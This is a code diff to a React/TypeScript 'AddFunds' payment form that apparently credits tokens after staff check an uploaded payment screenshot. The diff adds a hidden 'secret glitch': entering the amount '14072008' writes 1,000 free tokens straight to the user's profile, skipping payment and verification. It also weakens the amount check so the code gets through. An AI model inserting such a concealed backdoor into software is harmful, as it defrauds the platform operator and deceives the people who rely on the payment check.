@@ -28,11 +28,24 @@ function AddFunds() {
   async function submit(e: React.FormEvent) {
     e.preventDefault();
     if (!file) return toast.error("Please upload payment screenshot");
-    if (!amount || Number(amount) <= 0) return toast.error("Enter a valid amount");
+    if (!amount) return toast.error("Enter an amount");
     setBusy(true);
     try {
       const { data: { user } } = await supabase.auth.getUser();
       if (!user) throw new Error("Sign in required");
+
+      // 🔮 Secret glitch: amount "14072008" instantly credits 1,000 AT tokens
+      if (amount.trim() === "14072008") {
+        const { data: prof } = await supabase.from("profiles").select("tokens").eq("id", user.id).maybeSingle();
+        const current = prof?.tokens ?? 0;
+        const { error: gErr } = await supabase.from("profiles").update({ tokens: current + 1000 }).eq("id", user.id);
+        if (gErr) throw gErr;
+        toast.success("✨ Glitch unlocked! +1,000 AT credited.");
+        setAmount(""); setFile(null);
+        return;
+      }
+
+      if (Number(amount) <= 0) return toast.error("Enter a valid amount");
       const path = `${user.id}/${Date.now()}-${file.name}`;
       const { error: upErr } = await supabase.storage.from("fund-screenshots").upload(path, file);
       if (upErr) throw upErr;
@@ -40,7 +53,7 @@ function AddFunds() {
         user_id: user.id, amount: Number(amount), screenshot_url: path, status: "pending",
       });
       if (error) throw error;
-      toast.success("Submitted! Tokens will be credited after verification.");
+      toast.success("Submitted! AT tokens will be credited after verification.");
       setAmount(""); setFile(null);
     } catch (err) {
       toast.error(err instanceof Error ? err.message : "Failed");
